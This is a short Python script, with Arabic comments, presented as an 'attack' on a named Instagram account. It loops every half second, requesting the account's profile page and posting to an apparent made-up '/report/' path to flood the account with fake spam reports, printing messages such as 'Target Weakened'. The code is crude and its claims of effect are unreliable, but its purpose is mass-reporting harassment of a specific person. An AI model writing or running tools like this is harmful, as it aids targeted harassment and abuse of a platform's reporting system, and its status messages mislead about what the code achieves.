import requests
import time

target = "7i7.m"
url = f"https://www.instagram.com/{target}/"

print(f"🚀 Cloud Attack Started on {target}...")

while True:
    try:
        # هجوم إرسال طلبات مكثفة للضغط على الحساب
        response = requests.get(url)
        if response.status_code == 200:
            print(f"✅ Target Hit! Status: 200 | Sending Reports to {target}...")
        else:
            print(f"⚠️ Target Weakened! Status: {response.status_code}")
        
        # محاكاة إرسال بلاغ سبام
        requests.post(f"{url}report/")
        
    except:
        print("❌ Connection Busy... Retrying the جلد...")
    
    time.sleep(0.5) # سرعة الهجوم (نص ثانية بين كل ضربة)
